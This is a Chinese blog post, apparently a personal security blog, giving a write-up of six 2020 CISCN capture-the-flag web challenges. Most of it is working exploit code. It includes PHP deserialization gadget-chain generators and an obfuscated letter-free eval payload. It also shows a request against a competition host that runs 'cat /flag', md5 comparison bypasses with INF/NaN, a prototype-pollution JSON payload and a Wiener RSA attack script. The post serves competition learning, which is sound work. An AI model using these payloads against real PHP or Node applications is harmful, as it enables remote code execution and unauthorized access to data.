@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    2020ciscn-web题目writeup |
+    
+    Mount4in</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Mount4in" type="application/atom+xml">
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+  
+
+<article id="post-2020ciscn-web题目writeup" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      2020ciscn-web题目writeup
+    </h1>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2020/08/21/2020ciscn-web%E9%A2%98%E7%9B%AEwriteup/" class="article-date">
+  <time datetime="2020-08-21T06:47:07.000Z" itemprop="datePublished">2020-08-21</time>
+</a>
+        
+      </div>
+    
+
+    
+      
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+        
+        <p>Web越来越便宜</p>
+<a id="more"></a>
+
+<h1 id="0x01-babyunserialize"><a href="#0x01-babyunserialize" class="headerlink" title="0x01 babyunserialize"></a>0x01 babyunserialize</h1><p>wm2020ctf</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>\<span class="title">SQL</span> &#123;</span><br><span class="line">	<span class="title">class</span> <span class="title">Mapper</span> &#123;</span><br><span class="line">		<span class="title">protected</span></span><br><span class="line">		//! <span class="title">PDO</span> <span class="title">wrapper</span></span><br><span class="line">		$<span class="title">db</span>,</span><br><span class="line">		//! <span class="title">Database</span> <span class="title">engine</span></span><br><span class="line">		$<span class="title">engine</span>,</span><br><span class="line">		//! <span class="title">SQL</span> <span class="title">table</span></span><br><span class="line">		$<span class="title">source</span>,</span><br><span class="line">		//! <span class="title">SQL</span> <span class="title">table</span> (<span class="title">quoted</span>)</span><br><span class="line">		$<span class="title">table</span>,</span><br><span class="line">		//! <span class="title">Alias</span> <span class="title">for</span> <span class="title">SQL</span> <span class="title">table</span></span><br><span class="line">		$<span class="title">as</span>,</span><br><span class="line">		//! <span class="title">Last</span> <span class="title">insert</span> <span class="title">ID</span></span><br><span class="line">		$<span class="title">_id</span>,</span><br><span class="line">		//! <span class="title">Defined</span> <span class="title">fields</span></span><br><span class="line">		$<span class="title">fields</span>,</span><br><span class="line">		//! <span class="title">Adhoc</span> <span class="title">fields</span></span><br><span class="line">		$<span class="title">adhoc</span> = [],</span><br><span class="line">		//! <span class="title">Dynamic</span> <span class="title">properties</span></span><br><span class="line">		$<span class="title">props</span> = [];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;adhoc = <span class="keyword">array</span>(<span class="number">20</span> =&gt; [<span class="string">"expr"</span> =&gt; <span class="string">"test"</span>]);</span><br><span class="line">			<span class="keyword">$this</span>-&gt;db = <span class="keyword">$this</span>;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;props[<span class="string">'quotekey'</span>] = <span class="string">"phpinfo"</span>;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">CLI</span> &#123;</span><br><span class="line">	<span class="title">use</span> <span class="title">DB</span>\<span class="title">SQL</span>\<span class="title">Mapper</span>;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Agent</span> </span>&#123;</span><br><span class="line">		<span class="keyword">protected</span></span><br><span class="line">		$server,</span><br><span class="line">		$id,</span><br><span class="line">		$socket,</span><br><span class="line">		$flag,</span><br><span class="line">		$verb,</span><br><span class="line">		$uri,</span><br><span class="line">			$headers;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;server-&gt;events = <span class="keyword">array</span>(<span class="string">"disconnect"</span> =&gt; [<span class="keyword">new</span> Mapper(), <span class="string">"find"</span>]);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">WS</span> </span>&#123;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">	<span class="title">use</span> <span class="title">CLI</span>\<span class="title">WS</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">	<span class="comment">//print_r(serialize(new WS()));</span></span><br><span class="line">	<span class="keyword">echo</span> urlencode(serialize(<span class="keyword">array</span>(<span class="keyword">new</span> WS(), <span class="keyword">new</span> CLI\Agent())));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/2020ciscn-web%E9%A2%98%E7%9B%AEwriteup/image-20200820212428928.png" alt="image-20200820212428928"></p>
+<p>exp2:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>\<span class="title">SQL</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Mapper</span> &#123;</span><br><span class="line">        <span class="title">protected</span></span><br><span class="line">            //! <span class="title">PDO</span> <span class="title">wrapper</span></span><br><span class="line">            $<span class="title">db</span>,</span><br><span class="line">            //! <span class="title">Database</span> <span class="title">engine</span></span><br><span class="line">            $<span class="title">engine</span>,</span><br><span class="line">            //! <span class="title">SQL</span> <span class="title">table</span></span><br><span class="line">            $<span class="title">source</span>,</span><br><span class="line">            //! <span class="title">SQL</span> <span class="title">table</span> (<span class="title">quoted</span>)</span><br><span class="line">            $<span class="title">table</span>,</span><br><span class="line">            //! <span class="title">Alias</span> <span class="title">for</span> <span class="title">SQL</span> <span class="title">table</span></span><br><span class="line">            $<span class="title">as</span>,</span><br><span class="line">            //! <span class="title">Last</span> <span class="title">insert</span> <span class="title">ID</span></span><br><span class="line">            $<span class="title">_id</span>,</span><br><span class="line">            //! <span class="title">Defined</span> <span class="title">fields</span></span><br><span class="line">            $<span class="title">fields</span>,</span><br><span class="line">            //! <span class="title">Adhoc</span> <span class="title">fields</span></span><br><span class="line">            $<span class="title">adhoc</span> = [],</span><br><span class="line">            //! <span class="title">Dynamic</span> <span class="title">properties</span></span><br><span class="line">            $<span class="title">props</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;adhoc = <span class="keyword">array</span>(<span class="number">20</span> =&gt; [<span class="string">"expr"</span> =&gt; <span class="string">"test"</span>]);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;db = <span class="keyword">$this</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;props[<span class="string">'read'</span>] = <span class="string">"phpinfo"</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">CLI</span> &#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">DB</span>\<span class="title">Jig</span>\<span class="title">Mapper</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Agent</span> </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span></span><br><span class="line">            $server,</span><br><span class="line">            $id,</span><br><span class="line">            $socket,</span><br><span class="line">            $flag,</span><br><span class="line">            $verb,</span><br><span class="line">            $uri,</span><br><span class="line">            $headers;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;server-&gt;events = <span class="keyword">array</span>(<span class="string">"disconnect"</span> =&gt; [<span class="keyword">new</span> Mapper($a), <span class="string">"insert"</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">WS</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>\<span class="title">Jig</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Mapper</span>   &#123;</span><br><span class="line">        <span class="title">protected</span></span><br><span class="line">            //! <span class="title">Flat</span>-<span class="title">file</span> <span class="title">DB</span> <span class="title">wrapper</span></span><br><span class="line">            $<span class="title">db</span>,</span><br><span class="line">            //! <span class="title">Data</span> <span class="title">file</span></span><br><span class="line">            $<span class="title">file</span>,</span><br><span class="line">            //! <span class="title">Document</span> <span class="title">identifier</span></span><br><span class="line">            $<span class="title">id</span>,</span><br><span class="line">            //! <span class="title">Document</span> <span class="title">contents</span></span><br><span class="line">            $<span class="title">document</span>=[],</span><br><span class="line">            //! <span class="title">field</span> <span class="title">map</span>-<span class="title">reduce</span> <span class="title">handlers</span></span><br><span class="line">            $<span class="title">_reduce</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($a)</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;db = $a;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="number">20</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">CLI</span>\<span class="title">WS</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">    <span class="comment">//print_r(serialize(new WS()));</span></span><br><span class="line">    $a= <span class="keyword">new</span> DB\SQL\Mapper();</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="keyword">array</span>(<span class="keyword">new</span> WS(), <span class="keyword">new</span> CLI\Agent($a))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x02-easyphp"><a href="#0x02-easyphp" class="headerlink" title="0x02 easyphp"></a>0x02 easyphp</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//题目环境：php:7.4.8-apache</span></span><br><span class="line">    $pid = pcntl_fork();</span><br><span class="line">    <span class="keyword">if</span> ($pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'could not fork'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> ($pid)&#123;</span><br><span class="line">        $r=pcntl_wait($status);</span><br><span class="line">        <span class="keyword">if</span>(!pcntl_wifexited($status))&#123;</span><br><span class="line">            phpinfo();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])&amp;&amp;is_string($_GET[<span class="string">'a'</span>])&amp;&amp;!preg_match(<span class="string">"/[:\\\\]|exec|pcntl/i"</span>,$_GET[<span class="string">'a'</span>]))&#123;</span><br><span class="line">            call_user_func_array($_GET[<span class="string">'a'</span>],[$_GET[<span class="string">'b'</span>],<span class="keyword">false</span>,<span class="keyword">true</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        posix_kill(posix_getpid(), SIGUSR1);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<h1 id="pcntl-fork"><a href="#pcntl-fork" class="headerlink" title="pcntl_fork"></a>pcntl_fork</h1><p>(PHP 4 &gt;= 4.1.0, PHP 5, PHP 7)</p>
+<p>pcntl_fork — 在当前进程当前位置产生分支（子进程）。译注：fork是创建了一个子进程，父进程和子进程 都从fork的位置开始向下继续执行，不同的是父进程执行过程中，得到的fork返回值为子进程 号，而子进程得到的是0。</p>
+</blockquote>
+<p><a href="https://bugs.php.net/bug.php?id=52173" target="_blank" rel="noopener">phpbug</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?a&#x3D;call_user_func&amp;b&#x3D;pcntl_wait</span><br><span class="line">&#x2F;?a&#x3D;call_user_func&amp;b&#x3D;pcntl_waitpid</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x03-rceme"><a href="#0x03-rceme" class="headerlink" title="0x03 rceme"></a>0x03 rceme</h1><p>参考<a href="https://xz.aliyun.com/t/6068和RCTF的calc" target="_blank" rel="noopener">https://xz.aliyun.com/t/6068和RCTF的calc</a>,</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$str = <span class="string">"((((((1).(5))&#123;1&#125;)^(((1).(0.00001))&#123;4&#125;)).((((1).(0.1))&#123;2&#125;)^(((999**999).(1))&#123;2&#125;)).((((1).(5))&#123;1&#125;)^(((1).(0.00001))&#123;4&#125;)).((((1).(0.1))&#123;2&#125;)^((((1).(0.00001))&#123;4&#125;)|(((999**999).(1))&#123;2&#125;))).((((1).(0.1))&#123;2&#125;)|(((999**999).(1))&#123;1&#125;)).((((999**999).(1))&#123;0&#125;)^((((1).(0.1))&#123;2&#125;)|(((1).(-1))&#123;1&#125;))).((((1).(0.1))&#123;2&#125;)|(((1).(0.00001))&#123;4&#125;))))();//"</span>;</span><br><span class="line"><span class="keyword">eval</span>($str);</span><br><span class="line">$str = <span class="string">"&#123;if:1)"</span> . str_replace(<span class="keyword">array</span>(<span class="string">"&#123;"</span>, <span class="string">"&#125;"</span>), <span class="keyword">array</span>(<span class="string">"["</span>, <span class="string">"]"</span>), $str) . <span class="string">"&#125;&#123;end if&#125;"</span>;</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if:1)((((((1).(5))[1])^(((1).(0.00001))[4])).((((1).(0.1))[2])^(((999**999).(1))[2])).((((1).(5))[1])^(((1).(0.00001))[4])).((((1).(0.1))[2])^((((1).(0.00001))[4])|(((999**999).(1))[2]))).((((1).(0.1))[2])|(((999**999).(1))[1])).((((999**999).(1))[0])^((((1).(0.1))[2])|(((1).(-1))[1]))).((((1).(0.1))[2])|(((1).(0.00001))[4]))))();&#x2F;&#x2F;&#125;&#123;end if&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/2020ciscn-web%E9%A2%98%E7%9B%AEwriteup/image-20200820184830765.png" alt="image-20200820184830765"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;eci-2zei1qumnps754gs59g6.cloudeci1.ichunqiu.com&#x2F;?a&#x3D;&#123;if:1) echo &#96;cat &#x2F;flag&#96;;&#x2F;&#x2F;&#125;x&#123;end if&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x04-easytrick"><a href="#0x04-easytrick" class="headerlink" title="0x04 easytrick"></a>0x04 easytrick</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $trick1;</span><br><span class="line">	<span class="keyword">public</span> $trick2;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;trick1 = (string) <span class="keyword">$this</span>-&gt;trick1;</span><br><span class="line">		<span class="keyword">if</span> (strlen(<span class="keyword">$this</span>-&gt;trick1) &gt; <span class="number">5</span> || strlen(<span class="keyword">$this</span>-&gt;trick2) &gt; <span class="number">5</span>) &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">"你太长了"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;trick1 !== <span class="keyword">$this</span>-&gt;trick2 &amp;&amp; md5(<span class="keyword">$this</span>-&gt;trick1) === md5(<span class="keyword">$this</span>-&gt;trick2) &amp;&amp; <span class="keyword">$this</span>-&gt;trick1 != <span class="keyword">$this</span>-&gt;trick2) &#123;</span><br><span class="line">			<span class="keyword">echo</span> file_get_contents(<span class="string">"/flag"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> trick();</span><br><span class="line">$a-&gt;trick1 = <span class="string">"INF"</span>;</span><br><span class="line">$a-&gt;trick2 = <span class="number">1</span> / <span class="number">0</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $trick1;</span><br><span class="line">	<span class="keyword">public</span> $trick2;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;trick1 = (string) <span class="keyword">$this</span>-&gt;trick1;</span><br><span class="line">		<span class="keyword">if</span> (strlen(<span class="keyword">$this</span>-&gt;trick1) &gt; <span class="number">5</span> || strlen(<span class="keyword">$this</span>-&gt;trick2) &gt; <span class="number">5</span>) &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">"你太长了"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;trick1 !== <span class="keyword">$this</span>-&gt;trick2 &amp;&amp; md5(<span class="keyword">$this</span>-&gt;trick1) === md5(<span class="keyword">$this</span>-&gt;trick2) &amp;&amp; <span class="keyword">$this</span>-&gt;trick1 != <span class="keyword">$this</span>-&gt;trick2) &#123;</span><br><span class="line">			<span class="keyword">echo</span> file_get_contents(<span class="string">"/flag"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> trick();</span><br><span class="line">$a-&gt;trick1 = <span class="string">"NaN"</span>;</span><br><span class="line">$a-&gt;trick2 = <span class="number">0</span> / <span class="number">0</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x05-littlegame"><a href="#0x05-littlegame" class="headerlink" title="0x05 littlegame"></a>0x05 littlegame</h1><p>给了源码，审计源码可以看到有如下三个关键的路由</p>
+<p><img src="/2020/08/21/2020ciscn-web%E9%A2%98%E7%9B%AEwriteup/image-20200821142901154.png" alt="image-20200821142901154"></p>
+<ul>
+<li><p>/DeveloperControlPanel</p>
+<p>如果admin对应body传的的key索引对应的值和body传的password相等就可以得到flag。</p>
+<img src="/2020/08/21/2020ciscn-web%E9%A2%98%E7%9B%AEwriteup/比赛202006/国赛/wp/image-20200821143105291.png" alt="image-20200821143105291" style="zoom:200%;">
+</li>
+<li><p>/Privilege</p>
+<p>对body传的NewAttributeKey和NewAttributeValue作setFn操作，通过搜索可以知道setFn<a href="https://snyk.io/vuln/SNYK-JS-SETVALUE-450213" target="_blank" rel="noopener">有原型链污染漏洞</a><img src="/2020/08/21/2020ciscn-web%E9%A2%98%E7%9B%AEwriteup/image-20200821143353995.png" alt="image-20200821143353995"></p>
+</li>
+</ul>
+<p>解题步骤：</p>
+<ol>
+<li><pre><code>{&quot;NewAttributeKey&quot;:&quot;constructor.prototype.a1&quot;,&quot;NewAttributeValue&quot;:&quot;aaaaa&quot;}
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   ![image-20200821143857671](2020ciscn-web题目writeup&#x2F;image-20200821143857671.png)</span><br><span class="line"></span><br><span class="line">2. &#96;&#96;&#96;json</span><br><span class="line">   &#123;&quot;key&quot;:&quot;a1&quot;,&quot;password&quot;:&quot;aaaaa&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+![image-20200821144013140](2020ciscn-web题目writeup/image-20200821144013140.png)
+
+
+
+
+</code></pre></li>
+</ol>
+<h1 id="0x06-bd"><a href="#0x06-bd" class="headerlink" title="0x06 bd"></a>0x06 bd</h1><blockquote>
+<p><img src="/2020/08/21/2020ciscn-web%E9%A2%98%E7%9B%AEwriteup/image-20200821144531943.png" alt="image-20200821144531943"></p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">import</span> ContinuedFractions, Arithmetic</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wiener_hack</span><span class="params">(e, n)</span>:</span></span><br><span class="line">    <span class="comment"># firstly git clone https://github.com/pablocelayes/rsa-wiener-attack.git !</span></span><br><span class="line">    frac = ContinuedFractions.rational_to_contfrac(e, n)</span><br><span class="line">    convergents = ContinuedFractions.convergents_from_contfrac(frac)</span><br><span class="line">    <span class="keyword">for</span> (k, d) <span class="keyword">in</span> convergents:</span><br><span class="line">        <span class="keyword">if</span> k != <span class="number">0</span> <span class="keyword">and</span> (e * d - <span class="number">1</span>) % k == <span class="number">0</span>:</span><br><span class="line">            phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">            s = n - phi + <span class="number">1</span></span><br><span class="line">            discr = s * s - <span class="number">4</span> * n</span><br><span class="line">            <span class="keyword">if</span> (discr &gt;= <span class="number">0</span>):</span><br><span class="line">                t = Arithmetic.is_perfect_square(discr)</span><br><span class="line">                <span class="keyword">if</span> t != <span class="number">-1</span> <span class="keyword">and</span> (s + t) % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                    print(<span class="string">"Hacked!"</span>)</span><br><span class="line">                    <span class="keyword">return</span> d</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">c = <span class="number">37625098109081701774571613785279343908814425141123915351527903477451570893536663171806089364574293449414561630485312247061686191366669404389142347972565020570877175992098033759403318443705791866939363061966538210758611679849037990315161035649389943256526167843576617469134413191950908582922902210791377220066</span></span><br><span class="line">e = <span class="number">46867417013414476511855705167486515292101865210840925173161828985833867821644239088991107524584028941183216735115986313719966458608881689802377181633111389920813814350964315420422257050287517851213109465823444767895817372377616723406116946259672358254060231210263961445286931270444042869857616609048537240249</span></span><br><span class="line">n = <span class="number">86966590627372918010571457840724456774194080910694231109811773050866217415975647358784246153710824794652840306389428729923771431340699346354646708396564203957270393882105042714920060055401541794748437242707186192941546185666953574082803056612193004258064074902605834799171191314001030749992715155125694272289</span></span><br><span class="line">d = wiener_hack(e, n)</span><br><span class="line">print(d)</span><br><span class="line">m = pow(c, d, n)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+  </div>
+  <!-- 要添加的内容 -->
+  
+    <div>
+        <ul class="post-copyright">
+          <li class="post-copyright-author">
+          <strong>作者:  </strong>Mount4in</a>
+          </li>
+          <li class="post-copyright-link">
+          <strong>文章链接:  </strong>
